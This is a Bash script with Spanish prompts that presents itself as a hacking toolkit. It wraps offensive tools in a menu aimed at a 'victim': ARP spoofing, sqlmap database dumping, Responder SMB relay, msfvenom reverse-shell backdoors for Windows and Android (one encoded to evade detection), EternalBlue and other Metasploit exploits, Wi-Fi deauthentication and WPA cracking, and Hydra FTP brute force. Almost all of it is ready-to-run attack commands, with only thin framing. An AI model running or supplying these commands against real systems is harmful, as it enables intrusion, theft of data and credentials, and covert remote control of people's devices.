#!/bin/bash

#cripton666
echo 
echo -e "                                  \e[95mBETA HACKING.TOOLKIT ESCANEO Y HERRAMIENTAS AUTOMATIZADAS\e[0m"
echo -e "\e[31m

                             ██╗  ██╗████████╗ ██████╗  ██████╗ ██╗     ██╗  ██╗██╗████████╗
                             ██║  ██║╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██║ ██╔╝██║╚══██╔══╝
                             ███████║   ██║   ██║   ██║██║   ██║██║     █████╔╝ ██║   ██║   
                             ██╔══██║   ██║   ██║   ██║██║   ██║██║     ██╔═██╗ ██║   ██║   
                             ██║  ██║██╗██║   ╚██████╔╝╚██████╔╝███████╗██║  ██╗██║   ██║   
                             ╚═╝  ╚═╝╚═╝╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝   
\e[0m"                                                       
echo                                                              
echo 
echo
echo
opciones="DOS(DENEGACIÓN_DE_SERVICIO) INYECCIÓN_SQL SMB_RELAY(USO_EMPRESARIAL) EXPLOIT_BACKDOOR WIFI_WPA_WPA2 ESCANEO_DE_RED CRAQUEO_SERVIDOR_FTP SALIR"
select opcion in $opciones;
do
	if [ $opcion = "DOS(DENEGACIÓN_DE_SERVICIO)" ]; then
		echo -e "\e[96mEl ataque DOS o denegacion de servicio esta configurado para dentro de LAN"
		echo 
		read -p "VOY A ESCANEAR TU RED PARA VER IP DISPONIBLES PARA REALIZAR EL ATAQUE, INGRESE SU DIRECCION IP :" m 
		sudo nmap -sn $m/24
		echo
		echo
		echo    "SELECCIONE UNA DIRECCION IP"
		read -p "DIRECCION IP DE LA VICTIMA :" o
		read -p "IP(ROUNTER ej: 192.168.0.1) :" a 
		read -p "INTERFAZ DE RED (Wlan0 o wlan1 o eth0 ) :" l
		echo "COMENZANDO CON EL ATAQUE"
		sudo arpspoof -i $l -t $o -r $a  
	elif [ $opcion = "INYECCIÓN_SQL" ]; then
		echo -e "\e[96mLO PRIMERO ES VER SI LA PAGINA ES VULNERABLE PUEDES AGREGAR UNA COMILLA SIMPLE A LA PAGINA WEB AL FINAL EJ: www.prueba.com'"
		read -p "PAGINA WEB :" o 
		sudo sqlmap -u $o --dbs --random-agent
		echo
		echo
		read -p "SI LES MUESTRA BASE DE DATOS PRECIONAR a O CTRL+C PARA SALIR :" a 
		echo 
		read -p "NOMBRE DE LA BASE DE DATOS :" f 
		sudo sqlmap -u $o -dbs -D $f --tables 
		echo "YA QUE TENEMOS LAS TABLAS VAMOS A VISUALIZAR EL CONTENIDO"
		read -p "INTRODUCIR DATO QUE SE ENCUANTRA DENTRO DE LA TABLA :" M 
		sudo sqlmap -u $o --dbs -D $f -T $M --dump 
	elif [ $opcion = "SMB_RELAY(USO_EMPRESARIAL)" ]; then
		echo -e "\e[96mPARA QUEDAR EN MODO ESCUCHA NECESITO LA INTERFAZ DE RED"
		read -p "INTERFAZ DE RED EJ: (eth0 wlan0 wlan1) :" g 
		cd /usr/share/responder/
		sudo python Responder.py -I $g -rdw
		echo 
		echo	
	elif [ $opcion = "EXPLOIT_BACKDOOR" ]; then
		opciones="windows/meterpreter/reverse_tcp android/meterpreter/reverse_tcp windows/shell/reverse_tcp exploit/android/local/binder_uaf windows/meterpreter/reverse_tcp(shikata_ga_nai) exploit/apple_ios/browser/safari_libtiff exploit/windows/smb/ms17_010_eternalblue SALIR_A_MENU"

        select opcion in $opciones 
        do
            if [ $opcion = "windows/meterpreter/reverse_tcp" ]; then
            	echo 
                echo -e "\e[96mPara crear el Backdoor necesito algunos datos"
                read -p "PUERTO :" o 
                read -p "IP o HOST:" a 
                read -p "Nombre de la Aplicacion :" q
                echo "Creando Backdoor"
                msfvenom -p windows/meterpreter/reverse_tcp lhost=$a lport=$o -f exe -o $q.exe 
                echo "Creado con exito"
                echo
                echo "Conectando a base de datos Postgresql"
                sudo service postgresql start
                echo "Conectado con Exito" 
                echo "Abriendo Metasploit"
                msfconsole -x "use multi/handler;\
                set PAYLOAD windows/meterpreter/reverse_tcp;\
                set lhost $a;\
                set lport $o;\
                exploit"
                exit
            elif [ $opcion = "android/meterpreter/reverse_tcp" ]; then
                echo -e "\e[96mPara crear el backdoor necesito algunos datos"
                read -p "Puerto :" b 
                read -p "IP o HOST:" c 
                read -p "Nombre del Backdoor :" q
                echo "Creando Backdoor"
                        msfvenom -p android/meterpreter/reverse_tcp LHOST=$c LPORT=$b R > $q.apk
                echo "Creado con exito"
                echo "Conectando servicio postgresql"
                sudo service postgresql start 
                sudo "Conectado con Exito"
                echo "Abriendo Metasploit"
                msfconsole -x "use multi/handler;\
                set PAYLOAD android/meterpreter/reverse_tcp;\
                set lhost $c;\
                set lport $b;\
                exploit"
                exit
            elif [ $opcion = "windows/shell/reverse_tcp" ]; then
                echo -e "\e[96mPara crear el Backdoor necesito algunos datos"
                read -p "PUERTO :" o 
                read -p "IP o HOST:" a 
                read -p "Nombre de el Backdoor :" q
                echo "Creando Aplicacion"
                msfvenom -p windows/shell/reverse_tcp lhost=$a lport=$o -f exe -o $q.exe 
                echo "Creado con exito"
                echo "Conectando a servicio postgresql" 
                sudo service postgresql start
                echo "Conectado con Exito" 
                echo "Abriendo Metasploit"
                msfconsole -q -x "use multi/handler;\
                set PAYLOAD windows/shell/reverse_tcp;\
                set lhost $a;\
                set lport $o;\
                exploit"
                exit
            elif [ $opcion = "exploit/android/local/binder_uaf" ]; then
                echo -e "\e[96malerta es un exploit no un Backdoor"
                read -p "numero de la SESSION :" o 
                read -p "IP o Host :" a 
                echo "Abriendo servicio postgresql"
                sudo service postgresql start
                echo "Conectado con exito"
                echo "Ejecutando Metasploit"
                msfconsole -x "use exploit/android/local/binder_uaf;\
                set SESSION $o;\
                set LHOST $a:\
                exploit"      
                exit
            elif [ $opcion = "windows/meterpreter/reverse_tcp(shikata_ga_nai)" ]; then
                echo -e "\e[96mPara crear el Backdoor necesito algunos datos"
                read -p "PUERTO :" o 
                read -p "IP o HOST:" a 
                read -p "Nombre de la Aplicacion :" q
                echo "Creando Aplicacion"
                msfvenom -p windows/meterpreter/reverse_tcp lhost=$a lport=$o -e x86/shikata_ga_nai -i 20 -f exe > $q.exe 
                echo "Creado con exito"
                echo "Conectando a servicio postgresql" 
                sudo service postgresql start
                echo "Conectado con Exito" 
                echo "Abriendo Metasploit"
                msfconsole -x "use multi/handler;\
                set PAYLOAD windows/meterpreter/reverse_tcp;\
                set lhost $a;\
                set lport $o;\
                exploit"
                exit
            elif [ $opcion = "exploit/apple_ios/browser/safari_libtiff" ]; then
                echo -e "\e[96mAlerta es un exploit no un Backdoor"
                read -p "IP o HOST :" a 
                echo "Abriendo servicio postgresql"
                sudo service postgresql start
                echo "Conectado con exito"
                echo "Ejecutando Metasploit"
                msfconsole -x "use exploit/apple_ios/browser/safari_libtiff;\
                set URIPATH;\
                set VRHOST $a;\
                set VRSPORT 8080;\
                run"      
                exit
        	elif [ $opcion = "exploit/windows/smb/ms17_010_eternalblue" ]; then
                echo -e "\e[96mPara Ejecutar necesito un minimo de datos"
                read -p "IP VICTIMA RHOSTS :" o 
                echo "Conectando con Exploit"
                echo "Conectando a servicio postgresql" 
                sudo service postgresql start
                echo "Conectado con Exito" 
                echo "Abriendo Metasploit"
                msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;\
                set RHOSTS $o;\
                set RPORT 445;\
                set VERIFY_ARCH;\
                set VERIFY_TARGET;\
                exploit"
                exit
            elif [ $opcion = "SALIR_A_MENU" ]; then
            	./H.toolkit.sh    
        	fi
	done

	elif [ $opcion = "WIFI_WPA_WPA2" ]; then
		opciones="Optener-hancheake Desifrado-de-clave"
		select opcion in $opciones;
		do
			if [ $opcion = "Optener-hancheake" ]; then
				echo -e "\e[96mPRIMER PASO"
				read -p "Para comenzar te debo poner en modo monitor, selecciona o para continuar : " o
				echo
				echo "Configurando a modo Monitor :   $o"
				sudo airmon-ng start wlan0
				echo
				echo "Debemos matar proceso PID que nos daran problemas (ejemplo 445 768) "
				echo "Matar proceso dhclient"
				echo "Matar proceso network-manager"
				echo "wpa_suplicat"
				echo
				read -p "Numero de PID :" NUMERO
				sudo kill $NUMERO
				echo
				echo "ahora debes poner este comando en otra terminal para listar las redes disponibles (sudo airodump-ng wlan0mon)"
				echo
				echo
				echo "VAMOS A INTERVENIR LA RED"
				read -p "ahora debes poner el canal de la red  :" canal 
				read -p "ahora la mac BSSID de la red  :" mac 
				read -p "Pon un nombre al Documento que tendra la contraseña Encriptada  :" captura
				read -p "Interfaz de tu red :" interfas
				sudo airodump-ng -c $canal -w $captura --bssid $mac $interfas
				echo
			elif [ $opcion = "Desifrado-de-clave" ]; then
				echo -e "\e[96mahora vamos a deautenticar a un usuario para optener hancheake de la contraseña"
				read -p "Mac de BSSID Wifi  :"	wifi	
				read -p "Pone la Mac del Usuario STATION :" usuario
				sudo aireplay-ng -0 20 -a $wifi -c $usuario wlan0mon
				echo
				echo "Ahora vas a poner la Ruta de donde tienes el Diccionario y la mac de la wifi  :"
				read -p "Ruta del diccionario  :" diccionario 
				read -p "Nombre de la captura de la contraseña  :" face
				sudo aircrack-ng -w $diccionario -b $wifi $face
			else 
					echo "opcion no permitida" 
			fi	
		done 	
	elif [ $opcion = "ESCANEO_DE_RED" ]; then
		opciones="ESCANEO_PAGINAS_WEB ESCANEO_DE_IP SALIR_A_MENU"
		select opcion in $opciones; 
		do
			if [ $opcion = "ESCANEO_PAGINAS_WEB" ]; then
				echo -e "\e[33mDEVES PONER DIRECCION WEB DE LA VICTIMA"
				echo "ESCANEO NOS MUESTRA PUERTOS, MODO D.BUGUIN, SCRIPT ECHO EN LUA, Y SISTEMA OPERATIVO"
				echo "SE EJECUTARAN SCRIPT PARA PODER OBTENER BANER, USUARIOS, VERCION CON LA QUE OPERA LA PAGINA."
				read -p "PAGINA :" o 
				sudo nmap -sS -vv -d -sC -sV -O $o  
			elif [ $opcion = "ESCANEO_DE_IP" ]; then
				echo -e "\e[33mESCANEO DE IP"
				echo "¿QUE VAMOS A CONSEGUIR?"
				echo "VAMOS A INTENTAR EVADIR WIREWALL, FRAGMENTAREMOS EL PACKETE DARE TIEMPO T-4 Y ESCANEO GENERAL"
				read -p "DIRECCION IP :" o 
				sudo nmap -sS --script=firewalk -f -v -O -T4 -A $o 
			elif [ $opcion = "SALIR_A_MENU" ]; then
				./H.toolkit.sh
					#statements	
			fi
		done	
	elif [ $opcion = "CRAQUEO_SERVIDOR_FTP" ]; then
		echo -e "\e[96mDE UNA MANERA RAPIDA PODEMOS CRACKEAR UN SERVIDOR FTP"
		echo "PARA ESTO SE OCUPA 2 DICCIONARIOS 1 PARA EL USUARIO Y OTRO PARA EL PASSWORD"
		read -p "RUTA DEL DICCIONARIO PARA EL USUARIO EJ: home/prueba/Escritorio/diccionario.txt :" o 
		echo
		read -p "RUTA DEL DICCIONARIO PARA LA CONTRASEÑA EJ: home/prueba/Escritorio/diccionario.txt :" a
		echo
		read -p "IP DE LA VICTIMA :" O
		sudo hydra -L $o -P $a $O ftp
	fi
done					
